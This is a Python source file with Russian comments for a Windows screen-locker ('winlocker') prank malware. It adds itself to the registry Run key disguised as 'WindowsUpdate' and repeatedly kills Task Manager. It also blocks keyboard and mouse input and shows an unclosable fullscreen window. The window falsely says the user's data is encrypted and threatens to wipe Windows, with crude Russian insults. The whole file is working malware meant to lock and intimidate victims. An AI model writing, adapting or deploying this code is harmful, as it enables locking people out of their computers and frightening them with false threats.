import ctypes
import os
import sys
import time
import threading
import random
import tempfile
import urllib.request
import tkinter as tk
import shutil

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
TIMER_SECONDS = 15   # стартовый таймер (0 — если из автозагрузки)
# ============================================================

# ---------- НАДЁЖНЫЙ АВТОСТАРТ (РЕЕСТР) С КОПИРОВАНИЕМ ----------
def add_to_startup():
    try:
        # Путь к текущему файлу (может быть .py)
        current_path = os.path.abspath(__file__)
        # Формируем путь с расширением .pyw
        pyw_path = os.path.splitext(current_path)[0] + ".pyw"
        
        # Если текущий файл не .pyw, создаём копию .pyw
        if not current_path.endswith(".pyw"):
            try:
                shutil.copy2(current_path, pyw_path)
            except:
                pass
            current_path = pyw_path
        
        # Прописываем в автозагрузку путь к .pyw файлу
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ,
                         sys.executable.replace("python.exe", "pythonw.exe") + ' "' + current_path + '"')
        winreg.CloseKey(reg)
    except:
        pass

# ---------- глобальная блокировка клавиатуры/мыши ----------
def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

# ---------- фоновый блокировщик горячих клавиш ----------
def block_all_keys():
    try:
        import keyboard
        for combo in ['alt+f4','alt+tab','ctrl+shift+esc',
                      'ctrl+alt+del','win+d','win+r','win',
                      'alt','ctrl','shift','escape']:
            keyboard.add_hotkey(combo, lambda: None, suppress=True)
    except:
        pass

# ---------- убийца диспетчера задач ----------
def kill_taskmgr():
    while True:
        try:
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        except:
            pass
        time.sleep(0.1)

# ---------- анимация запуска ----------
def show_boot_animation():
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        lbl = tk.Label(root, text="", fg='white', bg='black',
                       font=('Courier', 36, 'bold'))
        lbl.pack(expand=True)
        messages = [
            "DEDSEK НЕ ПРОЩАЕТ",
            "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ",
            "КЛЮЧ РАСШИФРОВКИ НЕ НАЙДЕН",
            "СИСТЕМА ЗАБЛОКИРОВАНА"
        ]
        for msg in messages:
            lbl.config(text=msg)
            root.update()
            time.sleep(2)
        root.destroy()
    except:
        pass

# ---------- главный экран блокировки ----------
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)

        # ========== ЛЕВЫЙ БЛОК (страшный текст) ==========
        scary_text = (
            "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
            "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
            "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n"
            "СОСИ ХУЙ\n\n"
            "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n"
            "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n"
            "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n"
            "МУЧАЙСЯ ПИДОР\n\n"
            "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n"
            "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n"
            "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n"
            "4. Base64\nNDM1NjM0MjM0\n"
            "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
        )
        tk.Label(self.win, text=scary_text, fg='white', bg='black',
                 font=('Courier', 14), justify='left').place(relx=0.02, rely=0.1, anchor='nw')

        # ========== ПРАВЫЙ БЛОК (сообщение DEDSEK) ==========
        dedsek_text = (
            "DEDSEK НЕ ПРОЩАЕТ\n"
            "НЕ НАДО БЫЛО НИЧЕГО СКАЧИВАТЬ\n"
            "ИЗ НЕПРОВЕРЕННЫХ ИСТОЧНИКОВ\n\n"
            "DEDSEK ВИДИТ ТЕБЯ\n\n"
            "КСТАТИ, ЭТО ЕЩЕ НЕ ОДИН ВИРУС\n"
            "У ТЕБЯ ОТ МЕНЯ ЕСТЬ:\n"
            "- БЕКДОР\n"
            "- БОТНЕТ\n"
            "- РУТКИТ\n"
            "- ЧЕРВЯК ТАКОЙ ЖИРНЫЙ"
        )
        tk.Label(self.win, text=dedsek_text, fg='white', bg='black',
                 font=('Courier', 16), justify='right').place(relx=0.98, rely=0.1, anchor='ne')

        # ========== ЦЕНТРАЛЬНАЯ ФОРМА ВВОДА ==========
        center_frame = tk.Frame(self.win, bg='black')
        center_frame.place(relx=0.5, rely=0.7, anchor='center')

        tk.Label(center_frame, text="ВВЕДИТЕ ПАРОЛЬ:", fg='white', bg='black',
                 font=('Courier', 28)).pack(pady=(0, 10))
        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 28),
                              bg='black', fg='white', insertbackground='white')
        self.entry.pack(pady=(0, 10))
        self.status = tk.Label(center_frame, text="", fg='white', bg='black',
                               font=('Courier', 20))
        self.status.pack(pady=(0, 10))

        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()

        # Запускаем анимацию
        self.animate()

    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.status.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)

    def animate(self):
        # Просто поддерживаем окно "живым"
        self.win.after(50, self.animate)

# ============================================================
if __name__ == "__main__":
    # Если скрипт запущен из автозагрузки — таймер не нужен
    if os.path.basename(sys.argv[0]) != "winlocker.py":
        TIMER_SECONDS = 0

    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)

    block_input(True)
    threading.Thread(target=block_all_keys, daemon=True).start()

    show_boot_animation()
    WinLocker()
    tk.mainloop()
